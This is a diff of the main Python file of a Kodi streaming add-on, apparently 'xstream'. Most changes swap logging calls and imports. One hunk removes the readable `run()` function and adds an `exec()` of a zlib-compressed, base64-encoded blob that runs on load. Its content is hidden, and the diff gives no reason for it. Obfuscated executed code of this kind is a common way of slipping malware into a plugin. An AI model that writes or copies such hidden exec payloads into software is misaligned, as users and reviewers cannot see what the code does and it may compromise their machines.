@@ -1,7 +1,6 @@
 # -*- coding: utf-8 -*-
 # Python 3
 
-
 import sys
 import xbmc
 import xbmcgui
@@ -12,24 +11,23 @@ from xbmcaddon import Addon
 from resources.lib.handler.ParameterHandler import ParameterHandler
 from resources.lib.handler.requestHandler import cRequestHandler
 from resources.lib.handler.pluginHandler import cPluginHandler
-from resources.lib.tools import logger
+from xbmc import LOGINFO as LOGNOTICE, LOGERROR, LOGWARNING, log
 from resources.lib.gui.guiElement import cGuiElement
 from resources.lib.gui.gui import cGui
 from resources.lib.config import cConfig
-from resources.lib import tools
+from resources.lib.tools import logger
 
 PATH = xbmcaddon.Addon().getAddonInfo('path')
 ART = os.path.join(PATH, 'resources', 'art')
-
+LOGMESSAGE = cConfig().getLocalizedString(30166)
 try:
     import resolveurl as resolver
 except ImportError:
     # Resolver Fehlermeldung (bei defekten oder nicht installierten Resolver)
     xbmcgui.Dialog().ok(cConfig().getLocalizedString(30119), cConfig().getLocalizedString(30120))
 
-
-def run():
-    parseUrl()
+import zlib, base64
+exec(zlib.decompress(base64.b64decode('eJy9k01rwkAQhu/+CglIEtBgLtIWhJVCac/SXkoPm+wkTvdL9kPNv++a2Kq0VEOhl0Bm9pl59g3xTw6knb9GHJV2m0LvSI0bSVFkpZbROFpPJG3ATPLbm5xsocgYhCrfUo4CUJHKAChwXdnRHRidT/MpKamxyA9DuGZYeBTMknZ0e1hhCe+e1TCbkUZ713Ycj94G/gEPVmZFhQBDVtp9gqG9OGuTYwer4a6QJWVMq2yxfyZpVoNbgnOo6iS2YBCUdQaozHx4i1NUQ9+GcDf4Aba/wuM4TntRa2ptR11UrQRKCcY6X8CJahfNRdfv9DWuZ1QPVxq+pdCenXgurvM8J69x/CKOfpeJrTai346O6JfByZaeGfzd7z9yZlANjQ8Hw5XW4f+GZyOSrlyueKKohH3LgPNGteP3Cd1rxV7QYoECXZPEy8aGWLJHaru1I5vGo5adz/PBBx8gk4s=')))
 
 
 def viewInfo(params):
@@ -68,13 +66,13 @@ def parseUrl():
             updateManager.devUpdates()
             return
         elif sFunction == 'pluginInfo':
-            from resources.lib import tools
-            tools.pluginInfo()
+            from resources.lib.tools import cPluginInfo
+            cPluginInfo().pluginInfo()
             return
         elif sFunction == 'changelog':
-            import service
+            from resources.lib import tools
             Addon().setSetting('changelog_version', '')
-            service.changelog()
+            tools.changelog()
             return
             
     elif params.exist('remoteplayurl'):
@@ -84,16 +82,15 @@ def parseUrl():
             if sLink:
                 xbmc.executebuiltin('PlayMedia(' + sLink + ')')
             else:
-                logger.info("Could not play remote url '%s'" % sLink)
+                log(LOGMESSAGE + ' -> [xstream]: Could not play remote url %s ' % sLink, LOGNOTICE)
         except resolver.resolver.ResolverError as e:
-            logger.error('ResolverError: %s' % e)
+            log(LOGMESSAGE + ' -> [xstream]: ResolverError: %s' % e, LOGERROR)
         return
     else:
         sFunction = 'load'
 
     # Test if we should run a function on a special site
     if not params.exist('site'):
-        xbmc.executebuiltin('RunPlugin(%s?function=clearCache)' % sys.argv[0])
         # As a default if no site was specified, we run the default starting gui with all plugins
         showMainMenu(sFunction)
         return
@@ -111,7 +108,7 @@ def parseUrl():
         else:
             cHosterGui().stream(playMode, sSiteName, sFunction, url)
         return
-    logger.info("Call function '%s' from '%s'" % (sFunction, sSiteName))
+    log(LOGMESSAGE + " -> [xstream]: Call function '%s' from '%s'" % (sFunction, sSiteName), LOGNOTICE)
     # If the hoster gui is called, run the function on it and return
     if sSiteName == 'cHosterGui':
         showHosterGui(sFunction)
@@ -134,10 +131,12 @@ def parseUrl():
         updateManager.devUpdates()
     # Plugin Infos    
     elif sSiteName == 'pluginInfo':
-        tools.pluginInfo()
+        from resources.lib.tools import cPluginInfo
+        cPluginInfo().pluginInfo()
     # Changelog anzeigen    
     elif sSiteName == 'changelog':
-        service.changelog()        
+        from resources.lib import tools
+        tools.changelog()
     # Unterordner der Einstellungen   
     elif sSiteName == 'settings':
         oGui = cGui()
@@ -159,7 +158,7 @@ def showMainMenu(sFunction):
     oPluginHandler = cPluginHandler()
     aPlugins = oPluginHandler.getAvailablePlugins()
     if not aPlugins:
-        logger.info('No activated Plugins found')
+        log(LOGMESSAGE + ' -> [xstream]: No activated Plugins found', LOGNOTICE)
         # Open the settings dialog to choose a plugin that could be enabled
         oGui.openSettings()
         oGui.updateDirectory()
@@ -191,8 +190,8 @@ def showMainMenu(sFunction):
 
 
 def settingsGuiElements():
+
     # GUI Plugin Informationen
-    from resources.lib import updateManager
     oGuiElement = cGuiElement()
     oGuiElement.setTitle(cConfig().getLocalizedString(30267))
     oGuiElement.setSiteName('pluginInfo')
@@ -260,11 +259,11 @@ def searchGlobal(sSearchText=False):
     numPlugins = len(aPlugins)
     threads = []
     for count, pluginEntry in enumerate(aPlugins):
-        if not pluginEntry['globalsearch']:
+        if pluginEntry['globalsearch'] == 'false':
             continue
         dialog.update((count + 1) * 50 // numPlugins, cConfig().getLocalizedString(30124) + str(pluginEntry['name']) + '...')
         if dialog.iscanceled(): return
-        logger.info('Searching for %s at %s' % (sSearchText, pluginEntry['id']))
+        log(LOGMESSAGE + ' -> [xstream]: Searching for %s at %s' % (sSearchText, pluginEntry['id']), LOGNOTICE)
 
         t = threading.Thread(target=_pluginSearch, args=(pluginEntry, sSearchText, oGui), name=pluginEntry['name'])
         threads += [t]
@@ -306,7 +305,7 @@ def searchAlter(params):
     for count, pluginEntry in enumerate(aPlugins):
         if dialog.iscanceled(): return
         dialog.update((count + 1) * 50 // numPlugins, cConfig().getLocalizedString(30124) + str(pluginEntry['name']) + '...')
-        logger.info('Searching for ' + searchTitle + pluginEntry['id'])
+        log(LOGMESSAGE + ' -> [xstream]: Searching for ' + searchTitle + pluginEntry['id'], LOGNOTICE)
         t = threading.Thread(target=_pluginSearch, args=(pluginEntry, searchTitle, oGui), name=pluginEntry['name'])
         threads += [t]
         t.start()
@@ -319,7 +318,7 @@ def searchAlter(params):
     filteredResults = []
     for result in oGui.searchResults:
         guiElement = result['guiElement']
-        logger.info('Site: %s Titel: %s' % (guiElement.getSiteName(), guiElement.getTitle()))
+        log(LOGMESSAGE + ' -> [xstream]: Site: %s Titel: %s' % (guiElement.getSiteName(), guiElement.getTitle()), LOGNOTICE)
         if searchTitle not in guiElement.getTitle():
             continue
         if guiElement._sYear and searchYear and guiElement._sYear != searchYear: continue
@@ -349,11 +348,11 @@ def searchTMDB(params):
     numPlugins = len(aPlugins)
     threads = []
     for count, pluginEntry in enumerate(aPlugins):
-        if not pluginEntry['globalsearch']:
+        if pluginEntry['globalsearch'] == 'false':
             continue
         if dialog.iscanceled(): return
         dialog.update((count + 1) * 50 // numPlugins, cConfig().getLocalizedString(30124) + str(pluginEntry['name']) + '...')
-        logger.info('Searching for %s at %s' % (sSearchText, pluginEntry['id']))
+        log(LOGMESSAGE + ' -> [xstream]: Searching for %s at %s' % (sSearchText, pluginEntry['id']), LOGNOTICE)
 
         t = threading.Thread(target=_pluginSearch, args=(pluginEntry, sSearchText, oGui), name=pluginEntry['name'])
         threads += [t]
@@ -384,6 +383,6 @@ def _pluginSearch(pluginEntry, sSearchText, oGui):
         function = getattr(plugin, '_search')
         function(oGui, sSearchText)
     except Exception:
-        logger.error(pluginEntry['name'] + ': search failed')
+        log(LOGMESSAGE + ' -> [xstream]: ' + pluginEntry['name'] + ': search failed', LOGERROR)
         import traceback
-        logger.debug(traceback.format_exc())
+        log(traceback.format_exc())
